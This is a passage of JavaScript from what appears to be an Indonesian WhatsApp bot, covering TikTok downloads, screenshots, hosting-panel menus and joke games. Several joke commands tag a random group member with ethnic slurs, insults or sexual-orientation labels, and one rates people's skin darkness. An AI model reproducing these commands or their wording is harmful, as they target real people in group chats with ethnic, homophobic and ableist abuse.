          if (!text.startsWith("https://")) {
            return ReplyLanz(example("url"));
          }
          await tiktokDl(text).then(async result => {
            await Putzz.sendMessage(m.chat, {
              react: {
                text: "🕖",
                key: m.key
              }
            });
            if (!result.status) {
              return ReplyLanz("Error!");
            }
            if (result.durations == 0 && result.duration == "0 Seconds") {
              let araara = new Array();
              let urutan = 0;
              for (let a of result.data) {
                let imgsc = await prepareWAMessageMedia({
                  image: {
                    url: `${a.url}`
                  }
                }, {
                  upload: Putzz.waUploadToServer
                });
                await araara.push({
                  header: proto.Message.InteractiveMessage.Header.fromObject({
                    title: `Foto Slide Ke *${urutan += 1}*`,
                    hasMediaAttachment: true,
                    ...imgsc
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
                    }]
                  })
                });
              }
              const msgii = await generateWAMessageFromContent(m.chat, {
                viewOnceMessageV2Extension: {
                  message: {
                    messageContextInfo: {
                      deviceListMetadata: {},
                      deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: "*TIKTOK - DOWNLOADER*"
                      }),
                      carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: araara
                      })
                    })
                  }
                }
              }, {
                userJid: m.sender,
                quoted: m
              });
              await Putzz.relayMessage(m.chat, msgii.message, {
                messageId: msgii.key.id
              });
            } else {
              let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark");
              await Putzz.sendMessage(m.chat, {
                video: {
                  url: urlVid.url
                },
                caption: momok,
                footer: `\n${global.botname}`,
                buttons: [{
                  buttonId: `.putzzmp3 ${text}`,
                  buttonText: {
                    displayText: "ᴀᴍʙɪʟ ᴍᴜsɪᴋɴʏᴀ"
                  }
                }],
                viewOnce: true
              }, {
                quoted: m
              });
            }
          }).catch(e => console.log(e));
          await Putzz.sendMessage(m.chat, {
            react: {
              text: "✅",
              key: m.key
            }
          });
        }
        break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ssweb": {
if (!text) return ReplyLanz(example("https://example.com"))
if (!isUrl(text)) return ReplyLanz(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
//const equire('fs')
var data = await screenshotV2(text)
await Putzz.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break
//new fiturr
case 'jadibot':
case "clone": {

  let sender = m.sender.split("@")[0]

  await startPairing(Putzz, m, sender)

  ReplyLanz("🚀 *Memulai pairing...*\nTunggu bentar ya")
}
break
case "cpanel5": {
    if (!text) return ReplyLanz(example("username"));

    let usernya = text.trim().toLowerCase();
    if (!/^[a-z0-9]+$/i.test(usernya)) return ReplyLanz("⚠️ Username hanya boleh mengandung huruf dan angka.");
return Putzz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server yng mana Tuan',
          sections: [
            {
              title: 'PILIH SERVER NYA TUAN',
              highlight_label: ' ',
              rows: [
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗔𝗗𝗣", description: `📦 ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ɢᴛᴡ`, id: `.cadmin ${text}` },
                ]},
                { title: "CPANEL MENU", rows: [
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟭", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-1`, id: `.ram-v1 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟮", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-2`, id: `.ram-v2 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟯", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-3`, id: `.ram-v3 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟰", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-4`, id: `.ram-v4 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟱", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-5`, id: `.ram-v5 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟲", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-6`, id: `.ram-v6 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟳", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-7`, id: `.ram-v7 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟴", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-8`, id: `.ram-v8 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟵", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-9`, id: `.ram-v9 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟭𝟬", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-10`, id: `.ram-v10 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟭𝟭", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-11`, id: `.ram-v11 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟭𝟮", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-12`, id: `.ram-v12 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟭𝟯", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-13`, id: `.ram-v13 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟭𝟰", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-14`, id: `.ram-v14 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟭𝟱", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-15`, id: `.ram-v15 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟭𝟲", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-16`, id: `.ram-v16 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟭𝟳", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-17`, id: `.ram-v17 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟭𝟴", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-18`, id: `.ram-v18 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟭𝟵", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-19`, id: `.ram-v19 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟮𝟬", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-20`, id: `.ram-v20 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟮𝟭", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-21`, id: `.ram-v21 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟮𝟮", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-22`, id: `.ram-v22 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟮𝟯", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-23`, id: `.ram-v23 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟮𝟰", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-24`, id: `.ram-v24 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟮𝟱", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-25`, id: `.ram-v25 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟮𝟲", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-26`, id: `.ram-v26 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟮𝟳", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-27`, id: `.ram-v27 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟮𝟴", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-28`, id: `.ram-v28 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟮𝟵", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-29`, id: `.ram-v29 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟯𝟬", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-30`, id: `.ram-v30 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟯𝟭", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-31`, id: `.ram-v31 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟯𝟮", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-32`, id: `.ram-v32 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟯𝟯", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-33`, id: `.ram-v33 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟯𝟰", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-34`, id: `.ram-v34 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟯𝟱", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-35`, id: `.ram-v35 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟯𝟲", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-36`, id: `.ram-v36 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟯𝟳", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-37`, id: `.ram-v37 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟯𝟴", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-38`, id: `.ram-v38 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟯𝟵", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-39`, id: `.ram-v39 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟰𝟬", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-40`, id: `.ram-v40 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟰𝟭", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-41`, id: `.ram-v41 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟰𝟮", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-42`, id: `.ram-v42 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟰𝟯", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-43`, id: `.ram-v43 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟰𝟰", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-44`, id: `.ram-v44 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟰𝟰", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-45`, id: `.ram-v45 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟰𝟲", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-46`, id: `.ram-v46 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟰𝟳", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-47`, id: `.ram-v47 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟰𝟴", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-48`, id: `.ram-v48 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟰𝟵", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-49`, id: `.ram-v49 ${text}` },
                { header: " ", title: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩𝟱𝟬", description: `📦 ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ ᴅɪ sᴇʀᴠᴇʀ ᴋᴇ-50`, id: `.ram-v50 ${text}` },
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Mode Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: qfake})
}
break
case 'smeme': case 'stickermeme': case 'stickmeme': {

await Putzz.sendMessage(m.chat, {react: {text: '🚀', key: m.key}})
if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return ReplyLanz(`Usage: ${command} text1|text2`)
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await Putzz.downloadAndSaveMediaMessage(m.quoted)
mem = await UploadFileUgu(mee)
meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem.url}`
memek = await Putzz.sendAsSticker(m.chat,
 meme, m, {
 packname: `Whatsapp Bot ${namaOwner}`,
 })
} else {
ReplyLanz(`Kirim/Balas Gambar Dengan Caption ${command} text1|text2`)
}
}
break
case 'apakah': {
if (!q) return ReplyLanz(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul','Kagak tau gw 🗿','Kenapa tanya gw?🗿','Maleslah mau makan dulu']
const kah = apa[Math.floor(Math.random() * apa.length)]
ReplyLanz(`Pertanyaan : Apakah ${q}\nJawaban : ${kah}`)
}
break
case 'bisakah': {
if (!q) return ReplyLanz(`Penggunaan ${command} text\n\nContoh : ${command} saya menjadi presiden`)
const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
ReplyLanz(`Pertanyaan : Apakah ${q}\nJawaban : ${ga}`)
}
break
case 'bagaimanakah': {
if (!q) return ReplyLanz(`Penggunaan ${command} text\n\nContoh : ${command} cara mengatasi sakit hati`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
ReplyLanz(`Pertanyaan : Apakah ${q}\nJawaban : ${ya}`)
}
break
case 'rate': {
if (!q) return ReplyLanz(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
const ra = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const te = ra[Math.floor(Math.random() * ra.length)]
ReplyLanz(`Rate : ${q}\nJawaban : *${te}%*`)
}
break
case 'gantencek': case 'cekganten': {
if (!q) return ReplyLanz(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62% Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const teng = gan[Math.floor(Math.random() * gan.length)]
ReplyLanz(`Nama : ${q}\nJawaban : *${teng}*`)
}
break           
case 'cantiek': case 'cekcantk': {
if (!q) return ReplyLanz(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v','30% Semangat Kaka Merawat Dirinya><','20% Semangat Ya Kaka👍','40% Wahh Kaka><','50% kaka cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97% Assalamualaikum Ukhty🐊','100% Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94% Hai Cantik><','75% Hai Kakak Cantik','82% wihh Kakak Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const tik = can[Math.floor(Math.random() * can.length)]
ReplyLanz(`Nama : ${q}\nJawaban : *${tik}*`)
}
break
case 'cekhitam': case 'hitamcek': {
    ;
    if (!q) return ReplyLanz(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`);
    
    // Jika nama adalah "rifvky", langsung 100% hitam
    if (q.toLowerCase() === 'yann') {
        ReplyLanz(`Nama : ${q}\nJawaban : *100% Wah Awoaowowow ireng bet*`);
    } else {
        const can = ['10% Yahaha Hitam Lawak Hitam wkwkw Hitam', 
                     '30% Semangat Kaka Merawat Dirinya><', 
                     '20% Semangat Ya Kaka👍', 
                     '40% Wahh Kaka><', 
                     '50% Kaka Hitam deh><', 
                     '60% Hai Hitam🐊', 
                     '70% Hai Ukhty🐊', 
                     '62% Kakak Hitam><', 
                     '74% Kakak ni Hitam deh><', 
                     '83% Love You Kakak><', 
                     '97% Assalamualaikum Ukhty🐊', 
                     '100% Wah Awoaowowow ireng bet', 
                     '29% Semangat Kakak:)', 
                     '94% Hai Hitam><', 
                     '75% Hai Kakak Hitam', 
                     '82% Wihh Kakak Pasti Sering Perawatan kan??', 
                     '41% Semangat:)', 
                     '39% Lebih Semangat🐊'];
        
        const tik = can[Math.floor(Math.random() * can.length)];
        ReplyLanz(`Nama : ${q}\nJawaban : *${tik}*`);
    }
    ;
}
break;
            case 'chindo':
            case 'cina':
            case 'china':
            case 'papua':
            case 'jawa':
            case 'sunda':
            case 'bego':
            case 'goblok':
            case 'janda':
            case 'perawan':
            case 'babi':
            case 'ganteng':
            case 'tolol':
            case 'cantik':
            case 'duda':
            case 'pinter':
            case 'pintar':
            case 'asu':
            case 'bodoh':
            case 'gay':
            case 'lesby':
            case 'bajingan':
            case 'jancok':
            case 'anjing':
            case 'ngentod':
            case 'ngentot':
            case 'monyet':
            case 'mastah':
            case 'newbie':
            case 'nolep':
            case 'lesbi':
            case 'bangsat':
            case 'bangke':
            case 'sange':
            case 'sangean':
            case 'dakjal':
            case 'horny':
            case 'wibu':
            case 'yapit':
            case 'anj':
            case 'puki':
            case 'peak':
            case 'pantex':
            case 'pantek':
            case 'setan':
            case 'iblis':
            case 'cacat':
            case 'yatim':
            case 'piatu': {
                if (!m.isGroup) return ReplyLanz(mess.group)
                let member = participants.map(u => u.id).filter(v => v !== Putzz.user.jid)
                let org = member[Math.floor(Math.random() * member.length)];
                Putzz.sendMessage(m.chat, {
                    text: `orang ${command} disini adalah @${org.split('@')[0]}`,
                    contextInfo: {
                        mentionedJid: [m.sender, org],
                        forwardingScore: 9999999,
                        isForwarded: true,
                        "externalAdReply": {
                            "showAdAttribution": true,
                            "containsAutoReply": true,
                            "title": ` ${command} yang di tag`,
                            "body": `hiburan:)`,
                            "previewType": "PHOTO",
                            "thumbnailUrl": ` `,
                            "thumbnailUrl": ` `,
                            "sourceUrl": ` `
                        }
                    }
                }, {
                    quoted: qtoko
                })
            }
            break;
                        case 'sangecek':
            case 'ceksange':
            case 'gaycek':
            case 'cekgay':
            case 'lesbicek':
            case 'ceklesbi': {
                if (!q) return ReplyLanz(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
                const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
                const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
                ReplyLanz(`Nama : ${q}\nJawaban : *${sange}%*`)
            }
            break
            case 'kapankah': {
                if (!q) return ReplyLanz(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
                const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
                const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
                ReplyLanz(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
            }
            break
            case 'wangy': {
                if (!q) return ReplyLanz(`Contoh : ${prefix}wangy Ditss`)
                qq = q.toUpperCase()
                awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} 